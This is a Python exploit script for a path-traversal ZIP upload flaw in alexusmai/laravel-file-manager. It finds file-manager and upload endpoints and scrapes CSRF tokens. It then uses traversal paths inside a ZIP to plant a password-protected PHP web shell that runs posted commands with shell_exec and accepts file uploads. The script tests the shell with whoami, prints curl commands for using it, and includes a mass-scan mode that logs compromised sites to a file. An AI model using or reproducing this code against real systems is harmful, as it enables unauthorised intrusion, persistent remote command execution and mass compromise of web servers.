#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CVE-2025-65346 - ACCURATE UPLOADER v9.0
========================================
- Upload .txt test file FIRST
- Verify file exists
- Then upload shell
- 100% accurate detection
"""

import requests
import zipfile
import io
import re
import os
import sys
import time
import random
import string
import hashlib
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style

warnings.filterwarnings('ignore')
init(autoreset=True)

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   {Fore.BLUE}🔵 CVE-2025-65346 - ACCURATE UPLOADER v9.0                 {Fore.CYAN}║
║   {Fore.BLUE}🔵 TEST .txt FIRST → VERIFY → UPLOAD SHELL              {Fore.CYAN}║
║   {Fore.BLUE}🔵 alexusmai/laravel-file-manager <= 3.3.1              {Fore.CYAN}║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# ============================================================
# CONFIG
# ============================================================

ENDPOINTS = [
    '/filemanager', '/file-manager', '/fm',
    '/admin/filemanager', '/admin/file-manager',
    '/backend/filemanager', '/files', '/media',
    '/uploads', '/upload', '/file-manager/tinymce',
]

UPLOAD_PATHS = [
    '/upload', '/filemanager/upload', '/file-manager/upload',
    '/admin/filemanager/upload', '/admin/file-manager/upload',
    '/upload-zip', '/zip-upload', '/extract', '/unzip',
]

TRAVERSALS = [
    '../../../../../../../../public/',
    '../../../../../../../../var/www/html/',
    '../../../../../../../../var/www/public/',
    '../../../../../../../../storage/app/public/',
    '../../../../../../../../app/',
    '../../../../../',
    '../../../../',
    '../../../',
    '../../',
]

SEARCH_PATHS = [
    '/', '/public/', '/storage/', '/uploads/', '/files/',
    '/assets/', '/media/', '/images/', '/filemanager/',
    '/file-manager/', '/admin/', '/backend/', '/tmp/',
    '/html/', '/www/', '/public_html/', '/app/',
    '/var/www/', '/var/www/html/', '/storage/app/public/',
    '/vendor/', '/resources/', '/framework/',
]

# ============================================================
# SHELL GENERATOR
# ============================================================

def generate_shell():
    """Generate PHP shell with password"""
    
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    pwd_hash = hashlib.md5(password.encode()).hexdigest()
    
    name = f"{''.join(random.choices(string.ascii_lowercase, k=4))}_{random.randint(10000,99999)}.php"
    
    shell = f'''<?php
$h = "{pwd_hash}";
if (isset($_POST['p']) && md5($_POST['p']) === $h) {{
    if (isset($_POST['c'])) {{
        $c = $_POST['c'];
        $o = shell_exec($c);
        echo $o ? $o : "No output";
        exit;
    }}
    if (isset($_FILES['f'])) {{
        move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
        echo "OK";
        exit;
    }}
}}
echo "SHELL_ACTIVE";
?>'''
    
    return name, shell, password

# ============================================================
# MAIN EXPLOIT
# ============================================================

class AccurateUploader:
    def __init__(self, target, timeout=30):
        self.target = target.rstrip('/')
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
        })
        
        self.csrf = None
        self.upload_url = None
        self.endpoint_url = None
        self.working_method = None
        self.file_location = None
    
    def log(self, msg, color=Fore.WHITE):
        print(f"{color}{msg}{Style.RESET_ALL}")
    
    def find_endpoint(self):
        """Find FileManager endpoint"""
        self.log("[*] Finding FileManager...", Fore.YELLOW)
        
        for ep in ENDPOINTS:
            url = urljoin(self.target, ep)
            try:
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    html = r.text.lower()
                    if any(x in html for x in ['filemanager', 'file-manager', 'laravel-file-manager']):
                        self.endpoint_url = url
                        self.log(f"[+] Found: {url}", Fore.GREEN)
                        
                        # Extract CSRF
                        patterns = [
                            r'<meta[^>]*csrf-token[^>]*content="([^"]+)"',
                            r'_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        ]
                        for p in patterns:
                            m = re.search(p, r.text, re.IGNORECASE)
                            if m:
                                self.csrf = m.group(1)
                                self.log(f"[+] CSRF: {self.csrf[:20]}...", Fore.GREEN)
                                self.session.headers.update({'X-CSRF-TOKEN': self.csrf})
                                break
                        
                        if not self.csrf and 'XSRF-TOKEN' in self.session.cookies:
                            self.csrf = self.session.cookies.get('XSRF-TOKEN')
                        
                        return True
            except:
                continue
        
        self.log("[-] No endpoint found!", Fore.RED)
        return False
    
    def find_upload(self):
        """Find upload endpoint"""
        self.log("[*] Finding upload...", Fore.YELLOW)
        
        for up in UPLOAD_PATHS:
            url = urljoin(self.target, up)
            try:
                r = self.session.post(url, timeout=self.timeout)
                if r.status_code in [200, 201, 202, 400, 405]:
                    self.upload_url = url
                    self.log(f"[+] Upload: {url}", Fore.GREEN)
                    return True
            except:
                continue
        
        if self.endpoint_url:
            self.upload_url = urljoin(self.endpoint_url, '/upload')
            self.log(f"[!] Using: {self.upload_url}", Fore.YELLOW)
            return True
        
        return False
    
    def upload_test_txt(self):
        """Upload .txt test file and verify"""
        self.log("[*] Uploading test .txt file...", Fore.YELLOW)
        
        test_name = f"test_{int(time.time())}.txt"
        test_content = f"UPLOAD_TEST_{int(time.time())}_{random.randint(1000,9999)}"
        
        methods = [
            # Method 1: Standard
            lambda: self.session.post(
                self.upload_url,
                files={'file': (test_name, test_content, 'text/plain')},
                timeout=self.timeout
            ),
            # Method 2: With CSRF
            lambda: self.session.post(
                self.upload_url,
                files={'file': (test_name, test_content, 'text/plain')},
                data={'_token': self.csrf or ''},
                timeout=self.timeout
            ),
            # Method 3: Different field
            lambda: self.session.post(
                self.upload_url,
                files={'zip': (test_name, test_content, 'text/plain')},
                timeout=self.timeout
            ),
            # Method 4: CSRF header
            lambda: self.session.post(
                self.upload_url,
                files={'file': (test_name, test_content, 'text/plain')},
                headers={'X-CSRF-TOKEN': self.csrf or ''},
                timeout=self.timeout
            ),
        ]
        
        for i, method in enumerate(methods, 1):
            try:
                r = method()
                if r.status_code in [200, 201, 202, 204]:
                    self.log(f"[+] Upload success (method {i})", Fore.GREEN)
                    self.working_method = i
                    
                    # Wait for file to be written
                    time.sleep(2)
                    
                    # Search for file
                    found = self.search_file(test_name, test_content)
                    
                    if found:
                        self.log(f"[✅] FILE VERIFIED: {found}", Fore.GREEN)
                        self.file_location = found
                        return True
                    else:
                        self.log("[!] Upload success but file not found!", Fore.YELLOW)
                        return False
            except:
                continue
        
        self.log("[-] Upload test failed!", Fore.RED)
        return False
    
    def search_file(self, filename, content):
        """Search for uploaded file"""
        self.log("[*] Searching for uploaded file...", Fore.YELLOW)
        
        for path in SEARCH_PATHS:
            url = urljoin(self.target, path + filename)
            try:
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    if content in r.text:
                        return url
                    # Also check if file exists (may be empty)
                    if len(r.text) > 0:
                        return url
            except:
                continue
        
        # Try with different variations
        for path in SEARCH_PATHS:
            for ext in ['', '.txt']:
                url = urljoin(self.target, path + filename.replace('.txt', ext))
                try:
                    r = self.session.get(url, timeout=self.timeout)
                    if r.status_code == 200:
                        if content in r.text or len(r.text) > 0:
                            return url
                except:
                    continue
        
        return None
    
    def upload_shell_with_traversal(self, shell_name, shell_code):
        """Upload shell using traversal (same method as test)"""
        self.log("[*] Uploading shell...", Fore.YELLOW)
        
        for trav in TRAVERSALS:
            self.log(f"[*] Trying: {trav[:35]}...", Fore.YELLOW)
            
            # Create ZIP
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                path = trav.lstrip('/') + shell_name
                zf.writestr(path, shell_code)
                zf.writestr('dummy.txt', 'test')
            
            zip_data = zip_buffer.getvalue()
            
            # Upload using working method
            try:
                if self.working_method == 1:
                    r = self.session.post(
                        self.upload_url,
                        files={'file': ('payload.zip', zip_data, 'application/zip')},
                        timeout=self.timeout
                    )
                elif self.working_method == 2:
                    r = self.session.post(
                        self.upload_url,
                        files={'file': ('payload.zip', zip_data, 'application/zip')},
                        data={'_token': self.csrf or ''},
                        timeout=self.timeout
                    )
                elif self.working_method == 3:
                    r = self.session.post(
                        self.upload_url,
                        files={'zip': ('payload.zip', zip_data, 'application/zip')},
                        timeout=self.timeout
                    )
                elif self.working_method == 4:
                    r = self.session.post(
                        self.upload_url,
                        files={'file': ('payload.zip', zip_data, 'application/zip')},
                        headers={'X-CSRF-TOKEN': self.csrf or ''},
                        timeout=self.timeout
                    )
                else:
                    r = self.session.post(
                        self.upload_url,
                        files={'file': ('payload.zip', zip_data, 'application/zip')},
                        timeout=self.timeout
                    )
                
                if r.status_code in [200, 201, 202, 204]:
                    self.log("[+] Shell uploaded!", Fore.GREEN)
                    time.sleep(3)
                    
                    # Find shell
                    shell_url = self.find_shell(shell_name)
                    if shell_url:
                        return shell_url
            except:
                continue
        
        return None
    
    def find_shell(self, shell_name):
        """Find uploaded shell"""
        self.log("[*] Finding shell...", Fore.YELLOW)
        
        for path in SEARCH_PATHS:
            url = urljoin(self.target, path + shell_name)
            try:
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    if 'SHELL_ACTIVE' in r.text or '<?php' in r.text:
                        self.log(f"[✅] SHELL FOUND: {url}", Fore.GREEN)
                        return url
            except:
                continue
        
        return None
    
    def test_shell(self, shell_url, password):
        """Test if shell works"""
        self.log("[*] Testing shell...", Fore.YELLOW)
        
        try:
            # Test with whoami
            data = {'p': password, 'c': 'whoami'}
            r = self.session.post(shell_url, data=data, timeout=self.timeout)
            
            if r.status_code == 200 and len(r.text) > 0:
                self.log(f"[+] Shell working! Output: {r.text.strip()}", Fore.GREEN)
                return True
        except:
            pass
        
        # Try with echo
        try:
            data = {'p': password, 'c': 'echo test_shell_123'}
            r = self.session.post(shell_url, data=data, timeout=self.timeout)
            if 'test_shell_123' in r.text:
                self.log(f"[+] Shell working!", Fore.GREEN)
                return True
        except:
            pass
        
        self.log("[-] Shell not working!", Fore.RED)
        return False
    
    def run(self):
        """Main exploit"""
        print(f"\n{Fore.CYAN}="*70)
        print(f"{Fore.CYAN}🔵 TARGET: {self.target}")
        print(f"{Fore.CYAN}="*70)
        
        # Step 1: Find endpoint
        if not self.find_endpoint():
            self.log("[!] No endpoint, continuing...", Fore.YELLOW)
        
        # Step 2: Find upload
        if not self.find_upload():
            self.log("[-] No upload endpoint!", Fore.RED)
            return None
        
        # Step 3: Upload test .txt FIRST
        if not self.upload_test_txt():
            self.log("[!] Test upload failed!", Fore.RED)
            self.log("[!] Upload endpoint may be fake or not writable", Fore.RED)
            
            # Try different upload endpoints
            self.log("[*] Trying alternative upload endpoints...", Fore.YELLOW)
            alternatives = ['/upload', '/uploads', '/filemanager/upload', '/file-manager/upload']
            for alt in alternatives:
                self.upload_url = urljoin(self.target, alt)
                self.log(f"[*] Trying: {self.upload_url}", Fore.YELLOW)
                if self.upload_test_txt():
                    break
            else:
                self.log("[-] All upload attempts failed!", Fore.RED)
                return None
        
        # Step 4: Generate shell
        shell_name, shell_code, password = generate_shell()
        self.log(f"[+] Shell: {shell_name}", Fore.GREEN)
        self.log(f"[+] Password: {password}", Fore.CYAN)
        
        # Step 5: Upload shell
        shell_url = self.upload_shell_with_traversal(shell_name, shell_code)
        
        if not shell_url:
            # Try direct upload
            self.log("[*] Trying direct upload...", Fore.YELLOW)
            try:
                r = self.session.post(
                    self.upload_url,
                    files={'file': (shell_name, shell_code, 'application/x-php')},
                    timeout=self.timeout
                )
                if r.status_code in [200, 201, 202, 204]:
                    time.sleep(2)
                    shell_url = self.find_shell(shell_name)
            except:
                pass
        
        if shell_url:
            # Test shell
            if self.test_shell(shell_url, password):
                print(f"\n{Fore.GREEN}="*70)
                print(f"{Fore.GREEN}[✅] EXPLOIT SUCCESS!")
                print(f"{Fore.GREEN}[+] Shell URL: {shell_url}")
                print(f"{Fore.GREEN}[+] Password: {password}")
                print(f"{Fore.GREEN}[+] Command: curl -X POST {shell_url} -d 'p={password}&c=whoami'")
                print(f"{Fore.GREEN}="*70)
                return shell_url
            else:
                self.log("[!] Shell found but not working", Fore.YELLOW)
                return shell_url
        
        self.log("[-] Exploit failed!", Fore.RED)
        
        # Show manual steps
        print(f"\n{Fore.YELLOW}Manual troubleshooting:")
        print(f"1. Upload test: curl -X POST {self.upload_url} -F 'file=@test.txt'")
        print(f"2. Check: curl {self.target}/test.txt")
        print(f"3. Try different extension: .gif, .png, .jpg")
        print(f"4. Shell password: {password}")
        print(f"5. Shell name: {shell_name}")
        
        return None

# ============================================================
# MASS SCAN
# ============================================================

def scan_target(target):
    uploader = AccurateUploader(target)
    return uploader.run()

def mass_scan(targets_file):
    print(f"{Fore.CYAN}[*] Mass scanning...", Fore.YELLOW)
    
    with open(targets_file, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]
    
    print(f"{Fore.GREEN}[+] Total: {len(targets)}")
    
    results = []
    for t in targets:
        result = scan_target(t)
        if result:
            results.append(result)
            with open('valid_shells.txt', 'a') as f:
                f.write(f"{result}\n")
    
    print(f"\n{Fore.GREEN}[+] Valid shells: {len(results)}/{len(targets)}")
    return results

# ============================================================
# MAIN
# ============================================================

def main():
    print(BANNER)
    
    if len(sys.argv) < 2:
        print(f"{Fore.YELLOW}Usage:")
        print(f"  {Fore.CYAN}python3 {sys.argv[0]} https://target.com")
        print(f"  {Fore.CYAN}python3 {sys.argv[0]} targets.txt")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if os.path.isfile(target):
        mass_scan(target)
    else:
        uploader = AccurateUploader(target)
        uploader.run()

if __name__ == "__main__":
    main()